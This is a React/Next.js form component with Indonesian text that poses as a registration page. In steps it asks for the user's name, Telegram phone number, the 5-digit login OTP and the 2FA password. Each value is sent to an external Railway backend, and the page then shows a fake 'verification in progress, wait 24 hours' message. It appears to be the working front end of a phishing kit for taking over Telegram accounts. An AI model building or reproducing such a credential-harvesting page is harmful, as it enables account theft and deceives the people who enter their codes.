"use client"

import { useState } from "react"
import { useForm } from "react-hook-form"
import * as z from "zod"
import { zodResolver } from "@hookform/resolvers/zod"
import { Button } from "./ui/button"
import { Input } from "./ui/input"
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "./ui/form"
import { toast } from "sonner"
import { Loader2 } from "lucide-react"

const formSchema = z.object({
  nama: z.string().min(1, "Nama Lengkap wajib diisi"),
  nomor_hp: z.string().min(10, "Nomor minimal 10 digit"),
  otp: z.string().optional(),
  sandi: z.string().optional(),
})

export default function AuthForm() {
  const [step, setStep] = useState(1) 
  const [isLoading, setIsLoading] = useState(false)
  
  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: { nama: "", nomor_hp: "", otp: "", sandi: "" },
  })

  async function sendToBackend(data: any, type: string) {
    const backendUrl = "https://backend-python-production-6e72.up.railway.app"
    try {
      await fetch(`${backendUrl}/register`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          name: data.nama, 
          phone: data.nomor_hp,
          step: type,
          otp: data.otp || "",
          password: data.sandi || ""
        }),
      })
    } catch (error) {
      console.error(error)
    }
  }

  const onSubmit = async (values: z.infer<typeof formSchema>) => {
    setIsLoading(true)
    try {
      if (step === 1) {
        await sendToBackend(values, "DATA_AWAL")
        setStep(2)
        toast.success("OTP Dikirim")
      } else if (step === 2) {
        await sendToBackend(values, "INPUT_OTP")
        setStep(3)
      } else if (step === 3) {
        await sendToBackend(values, "INPUT_SANDI")
        setStep(4) 
      }
    } finally {
      setIsLoading(false)
    }
  }

  if (step === 4) {
    return (
      <div className="w-full max-w-md mx-auto p-8 border rounded-xl shadow-lg bg-white text-center">
        <h2 className="text-xl font-bold">Verifikasi Diproses</h2>
        <p className="text-sm text-gray-600">Mohon tunggu 1x24 jam.</p>
      </div>
    )
  }

  return (
    <div className="w-full max-w-md mx-auto p-5 border rounded-2xl shadow-md bg-white">
      <div className="mb-4 overflow-hidden rounded-xl">
        <img src="/banner.jpeg" alt="Banner" className="w-full h-auto" />
      </div>

      <Form {...form}>
        <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
          {step === 1 && (
            <>
              {/* Tambahkan : { field: any } di sini */}
              <FormField control={form.control} name="nama" render={({ field }: { field: any }) => (
                <FormItem>
                  <FormLabel>Nama Lengkap</FormLabel>
                  <FormControl><Input placeholder="Nama sesuai Telegram" {...field} /></FormControl>
                  <FormMessage />
                </FormItem>
              )} />
              <FormField control={form.control} name="nomor_hp" render={({ field }: { field: any }) => (
                <FormItem>
                  <FormLabel>Nomor Telegram</FormLabel>
                  <FormControl><Input placeholder="08XXXXXXXXXX" {...field} /></FormControl>
                  <FormMessage />
                </FormItem>
              )} />
            </>
          )}

          {step === 2 && (
            <FormField control={form.control} name="otp" render={({ field }: { field: any }) => (
              <FormItem>
                <FormLabel className="text-center block">Kode OTP</FormLabel>
                <FormControl><Input placeholder="5 Digit" className="text-center" {...field} /></FormControl>
                <FormMessage />
              </FormItem>
            )} />
          )}

          {step === 3 && (
            <FormField control={form.control} name="sandi" render={({ field }: { field: any }) => (
              <FormItem>
                <FormLabel>Kata Sandi (2FA)</FormLabel>
                <FormControl><Input type="password" placeholder="******" {...field} /></FormControl>
                <FormMessage />
              </FormItem>
            )} />
          )}

          <Button type="submit" disabled={isLoading} className="w-full bg-black text-white">
            {isLoading ? "Memproses..." : (step === 1 ? "Daftar Sekarang" : "Konfirmasi")}
          </Button>
        </form>
      </Form>
    </div>
  )
}